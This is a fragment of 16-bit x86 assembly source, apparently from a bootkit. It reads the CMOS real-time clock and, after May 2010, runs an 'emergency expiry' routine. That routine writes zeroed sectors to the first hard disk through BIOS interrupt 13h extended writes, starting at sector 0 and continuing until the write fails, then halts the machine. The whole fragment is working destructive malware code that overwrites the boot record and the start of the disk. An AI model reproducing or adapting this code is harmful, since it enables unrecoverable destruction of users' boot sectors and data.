
; emergency date expiry

; BCD or hex?
mov al,byte 0Bh
out 70h,al              ; access 0Bh - RTC - STATUS REGISTER B
in al,71h               ; read the Status Register

test al,00000100b
jnz Emergency_Expiry_Binary


Emergency_Expiry_BCD:

; Year (2010)
mov al,byte 09h
out 70h,al              ; access CMOS 09h - RTC - YEAR
in al,71h               ; read the year
cmp al,10h              ; > 2010?
jne Emergency_Expired

; Month (May)
mov al,byte 08h
out 70h,al              ; access CMOS 08h - RTC - MONTH
in al,71h               ; read the month
cmp al,05h              ; > May?
ja Emergency_Expired

jmp Emergency_Expiry_Exit


Emergency_Expiry_Binary:

; Year (2010)
mov al,byte 09h
out 70h,al              ; access CMOS 09h - RTC - YEAR
in al,71h               ; read the year
cmp al,10               ; > 2010?
jne Emergency_Expired

; Month (May)
mov al,byte 08h
out 70h,al              ; access CMOS 08h - RTC - MONTH
in al,71h               ; read the month
cmp al,5                ; > May?
ja Emergency_Expired

jmp Emergency_Expiry_Exit



Emergency_Expired:

; zero out buffer
mov di,Sector_Buffer
mov cx,512 / 4
xor eax,eax
rep stosd

; remove the entire bootkit
mov [Disk_Address_Packet_LBA_Low],dword 0                                       ; (Sector Number, start with zero)
mov [Disk_Address_Packet_Buffer],dword Sector_Buffer                            ; (Segment:Offset)
mov [Disk_Address_Packet_Count],dword 1                                         ; (Sector Count)

; interrupt 13h, Function 43h: Extended Write
mov si,Disk_Address_Packet_Size
mov dl,80h
mov ax,4300h
Emergency_Expired_Loop:
int 13h
jc Emergency_Expired_Stop
inc dword [Disk_Address_Packet_Count]
jmp Emergency_Expired_Loop


Emergency_Expired_Stop:
xor eax,eax
mov ebx,'FAIL' ^ 19841984h
xor ebx,19841984h
xor ecx,ecx
xor edx,edx

cli
hlt

Emergency_Expiry_Exit:
